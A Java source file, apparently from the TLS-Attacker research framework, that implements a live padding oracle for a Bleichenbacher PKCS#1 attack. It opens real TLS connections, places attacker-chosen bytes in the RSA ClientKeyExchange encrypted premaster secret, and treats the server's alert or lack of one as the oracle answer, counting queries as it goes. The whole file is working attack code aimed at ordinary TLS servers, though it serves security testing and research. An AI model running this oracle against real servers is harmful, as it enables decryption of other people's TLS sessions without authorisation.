package de.rub.nds.tlsattacker.attacks.pkcs1.oracles;

import de.rub.nds.tlsattacker.modifiablevariable.ModifiableVariable;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.tls.config.ClientCommandConfig;
import de.rub.nds.tlsattacker.tls.config.ClientConfigHandler;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.alert.messages.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.ccs.messages.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.messages.CertificateMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.messages.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.messages.ServerHelloDoneMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.messages.ServerHelloMessage;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.TlsContextAnalyzer;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTraceType;
import de.rub.nds.tlsattacker.tls.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.MathHelper;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;

/**
 * 
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class RealDirectMessagePkcs1Oracle extends Pkcs1Oracle {

    ClientCommandConfig config;

    public RealDirectMessagePkcs1Oracle(PublicKey pubKey, ClientCommandConfig clientConfig) {
	this.publicKey = (RSAPublicKey) pubKey;
	this.blockSize = MathHelper.intceildiv(publicKey.getModulus().bitLength(), 8);
	this.config = clientConfig;
	this.config.setWorkflowTraceType(WorkflowTraceType.CLIENT_HELLO);

	LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
	Configuration ctxConfig = ctx.getConfiguration();
	LoggerConfig loggerConfig = ctxConfig.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
	loggerConfig.setLevel(Level.INFO);
	ctx.updateLoggers();
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {

	ConfigHandler configHandler = new ClientConfigHandler();
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	List<ProtocolMessage> protocolMessages = new LinkedList<>();
	protocolMessages.add(new ServerHelloMessage(ConnectionEnd.SERVER));
	protocolMessages.add(new CertificateMessage(ConnectionEnd.SERVER));
	protocolMessages.add(new ServerHelloDoneMessage(ConnectionEnd.SERVER));

	RSAClientKeyExchangeMessage cke = new RSAClientKeyExchangeMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(cke);
	protocolMessages.add(new ChangeCipherSpecMessage(ConnectionEnd.CLIENT));
	protocolMessages.add(new AlertMessage(ConnectionEnd.SERVER));

	ModifiableVariable<byte[]> pms = new ModifiableVariable<>();
	pms.setModification(ByteArrayModificationFactory.explicitValue(msg));
	cke.setEncryptedPremasterSecret(pms);

	WorkflowConfigurationFactory.appendProtocolMessagesToWorkflow(tlsContext, protocolMessages);

	if (numberOfQueries % 100 == 0) {
	    LOGGER.info("Number of queries so far: {}", numberOfQueries);
	}

	boolean valid = true;
	try {
	    workflowExecutor.executeWorkflow();
	} catch (Exception e) {
	    valid = false;
	    e.printStackTrace();
	} finally {
	    numberOfQueries++;
	    transportHandler.closeConnection();
	}

	if (TlsContextAnalyzer.containsAlertAfterModifiedMessage(tlsContext) == TlsContextAnalyzer.AnalyzerResponse.ALERT) {
	    valid = false;
	}

	return valid;
    }
}
